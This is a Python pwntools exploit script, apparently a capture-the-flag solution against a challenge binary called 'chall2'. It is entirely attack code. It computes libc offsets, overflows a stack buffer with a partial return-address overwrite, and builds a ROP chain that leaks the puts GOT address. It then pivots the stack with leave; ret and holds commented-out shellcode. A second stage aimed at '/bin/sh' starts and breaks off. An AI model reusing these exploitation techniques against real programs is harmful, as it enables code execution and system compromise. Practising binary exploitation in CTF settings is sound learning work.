# RazviOverflow
# python3

from pwn import *
import pprint, sys


pp = pprint.PrettyPrinter(indent=4)

local_library = ELF("libc.so.6")

#pp.pprint(local_library.symbols)

local_system_address = local_library.symbols[b'system']
local_puts_address = local_library.symbols[b'puts']
system_offset = int(local_system_address) - int(local_puts_address)

print("System offset relative to puts: " + hex(system_offset))

local_binary = ELF("chall2")

local_binary_puts_plt = local_binary.plt[b'puts']
local_binary_puts_got = local_binary.got[b'puts']
local_binary_help_is_here = local_binary.symbols[b'helpishere']
finally_you_helped_me_address = local_binary.symbols[b'finallyyouhelpedme'] 
# Addresses of 'finally you helped me' and 'ok' only differ the least significant byte

least_function_byte = int(finally_you_helped_me_address) & 0b11111111

payload = b"A" * 0x20
payload += b"B" * 0x8
payload += bytes([least_function_byte])

'''
context.arch = 'amd64'
payload_after_help_first = asm(shellcraft.sh())
payload_after_help_first += b"\x90" * (0x64 - len(payload_after_help_first))
'''

## GADGETS ##
pop_rdi_ret = 0x0000000000400943
leave_ret = 0x0000000000400778
finally_final_read = 0x00400761


payload_to_print_puts = p64(pop_rdi_ret)
payload_to_print_puts += p64(local_binary_puts_got)
payload_to_print_puts += p64(local_binary_puts_plt)
payload_to_print_puts += p64(finally_you_helped_me_address)
payload_to_print_puts += b"\x90" * (0x64 - len(payload_to_print_puts))

payload_after_help_second = b"C" * 0x20
payload_after_help_second += p64(int(local_binary_help_is_here) - 8) # RBP
payload_after_help_second += p64(leave_ret)



'''
payload_after_help += p64(pop_rdi_ret)
payload_after_help += p64(local_binary_puts_got)
payload_after_help += p64(local_binary_puts_plt)
'''

with open("input_file", "wb") as file:
	file.write(payload)
	file.write(payload_to_print_puts)
	file.write(payload_after_help_second)


binary = process("chall2")
print(binary.recv())
binary.send(payload)
print(binary.recv())
binary.send(payload_to_print_puts)
binary.send(payload_after_help_second)
print(binary.recvall())
binary.interactive()


########### 2nd stage

bin_sh_address = next(local_library.search(b"/bin/sh"))


